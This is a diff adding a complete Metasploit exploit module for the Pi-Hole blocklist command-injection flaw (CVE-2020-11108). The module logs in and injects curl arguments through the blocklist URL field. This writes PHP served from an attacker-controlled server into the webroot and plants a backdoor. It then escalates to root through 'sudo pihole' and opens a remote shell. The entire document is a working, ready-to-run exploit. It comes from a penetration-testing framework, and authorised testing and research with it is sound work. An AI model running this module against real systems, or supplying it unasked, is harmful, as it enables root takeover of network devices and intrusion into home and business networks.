@@ -1,0 +1,261 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Pi-Hole heisenbergCompensator Blocklist OS Command Execution',
+        'Description' => %q{
+          This exploits a command execution in Pi-Hole <= 4.4.  A new blocklist is added, and then an
+          update is forced (gravity) to pull in the blocklist content.  PHP content is then written
+          to a file within the webroot.  Phase 1 writes a sudo pihole command to launch teleporter,
+          effectively running a priv esc.  Phase 2 writes our payload to teleporter.php, overwriting,
+          the content.  Lastly, the phase 1 PHP file is called in the web root, which launches
+          our payload in teleporter.php with root privileges.
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'h00die', # msf module
+            'Nick Frichette' # original PoC, discovery
+          ],
+        'References' =>
+          [
+            ['EDB', '48443'],
+            ['EDB', '48442'],
+            ['URL', 'https://frichetten.com/blog/cve-2020-11108-pihole-rce/'],
+            ['URL', 'https://github.com/frichetten/CVE-2020-11108-PoC'],
+            ['CVE', '2020-11108']
+          ],
+        'Platform' => ['php'],
+        'Privileged' => true,
+        'Arch' => ARCH_PHP,
+        'Targets' =>
+          [
+            [ 'Automatic Target', {}]
+          ],
+        'DisclosureDate' => 'May 10 2020',
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],
+          'Reliability' => [REPEATABLE_SESSION]
+        }
+      )
+    )
+    # set the default port, and a URI that a user can set if the app isn't installed to the root
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptPort.new('SRVPORT', [true, 'Web Server Port, must be 80', 80]),
+        OptString.new('PASSWORD', [ false, 'Password for Pi-Hole interface', '']),
+        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/'])
+      ]
+    )
+  end
+
+  def setup
+    super
+    @stage = 0
+  end
+
+  def on_request_uri(cli, request)
+    if request.method == 'GET'
+      vprint_status('Received GET request.  Responding')
+      send_response(cli, rand_text_alphanumeric(5..10))
+      return
+    end
+
+    case @stage
+    when 0
+      vprint_status('(1/2) Sending priv esc trigger')
+      send_response(cli, %q{<?php shell_exec("sudo pihole -a -t") ?>})
+      @stage += 1
+    when 1
+      vprint_status('(2/2) Sending root payload')
+      send_response(cli, payload.encoded)
+      @stage = 0
+    else
+      send_response(cli, rand_text_alphanumeric(5..10))
+      vprint_status("Server received default request for #{request.uri}")
+    end
+  end
+
+  def check
+    begin
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'admin', 'index.php'),
+        'method' => 'GET'
+      )
+      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
+      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
+
+      # <b>Pi-hole Version <\/b> v4.3.2                                                            <b>
+      # <b>Pi-hole Version </b> v4.3.2 <a class="alert-link lookatme" href="https://github.com/pi-hole/pi-hole/releases" target="_blank">(Update available!)</a>            <b>
+      %r{<b>Pi-hole Version\s*</b>\s*v?(?<version>[\d\.]+).*<b>} =~ res.body
+
+      if version && Gem::Version.new(version) <= Gem::Version.new('4.4')
+        vprint_good("Version Detected: #{version}")
+        return CheckCode::Appears
+      else
+        vprint_bad("Version Detected: #{version}")
+        return CheckCode::Safe
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+    CheckCode::Safe
+  end
+
+  def add_blocklist(file, token, cookie)
+    # according to the writeup, if you have a port, the colon gets messed up in the encoding.
+    # also, looks like if you have a path (/file.php), it won't trigger either, or the / gets
+    # messed with.
+    data = {
+      'newuserlists' => %(http://#{datastore['SRVHOST']}#" -o #{file} -d "),
+      'field' => 'adlists',
+      'token' => token,
+      'submit' => 'saveupdate'
+    }
+
+    send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
+      'method' => 'POST',
+      'cookie' => cookie,
+      'vars_get' => {
+        'tab' => 'blocklists'
+      },
+      'data' => data.to_query
+    )
+  end
+
+  def update_gravity(cookie)
+    vprint_status('Forcing gravity pull')
+    send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'admin', 'scripts', 'pi-hole', 'php', 'gravity.sh.php'),
+      'cookie' => cookie
+    )
+  end
+
+  def execute_shell(backdoor_name, cookie)
+    vprint_status('Popping root shell')
+    send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'admin', 'scripts', 'pi-hole', 'php', backdoor_name),
+      'cookie' => cookie
+    )
+  end
+
+  def login(cookie)
+    vprint_status('Login required, attempting login.')
+    send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
+      'cookie' => cookie,
+      'vars_get' => {
+        'tab' => 'blocklists'
+      },
+      'vars_post' => {
+        'pw' => datastore['PASSWORD']
+      },
+      'method' => 'POST'
+    )
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
+    end
+
+    if datastore['SRVPORT'] != 80
+      fail_with(Failure::BadConfig, 'SRVPORT must be set to 80 for exploitation to be successful')
+    end
+
+    if datastore['SRVHOST'] == '0.0.0.0'
+      fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful')
+    end
+
+    start_service({ 'Uri' => {
+      'Proc' => proc do |cli, req|
+        on_request_uri(cli, req)
+      end,
+      'Path' => '/'
+    } })
+
+    begin
+      # get cookie
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'admin', 'index.php')
+      )
+      cookie = res.get_cookies
+      print_status("Using cookie: #{cookie}")
+
+      # get token
+      res = send_request_cgi(
+        'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),
+        'cookie' => cookie,
+        'vars_get' => {
+          'tab' => 'blocklists'
+        }
+      )
+
+      # check if we got hit by a login prompt
+      if res && res.body.include?('Sign in to start your session')
+        res = login(cookie)
+      end
+
+      if res && res.body.include?('Sign in to start your session')
+        fail_with(Failure::BadConfig, 'Incorrect Password')
+      end
+
+      # <input type="hidden" name="token" value="t51q3YuxWT873Nn+6lCyMG4Lg840gRCgu03akuXcvTk=">
+      # may also include /
+      %r{name="token" value="(?<token>[\w+=/]+)">} =~ res.body
+
+      unless token
+        fail_with(Failure::UnexpectedReply, 'Unable to find token')
+      end
+      print_status("Using token: #{token}")
+
+      # plant backdoor
+      backdoor_name = "#{rand_text_alphanumeric 5..10}.php"
+      register_file_for_cleanup backdoor_name
+      print_status('Adding backdoor reference')
+      add_blocklist(backdoor_name, token, cookie)
+
+      # update gravity
+      update_gravity(cookie)
+      if @stage == 0
+        print_status('Sending 2nd gravity update request.')
+        update_gravity(cookie)
+      end
+
+      # plant root upgrade
+      print_status('Adding root reference')
+      add_blocklist('teleporter.php', token, cookie)
+
+      # update gravity
+      update_gravity(cookie)
+      if @stage == 1
+        print_status('Sending 2nd gravity update request.')
+        update_gravity(cookie)
+      end
+
+      # pop shell
+      execute_shell(backdoor_name, cookie)
+      print_status("Blocklists must be removed manually from #{normalize_uri(target_uri.path, 'admin', 'settings.php')}?tab=blocklists")
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+
+  end
+end
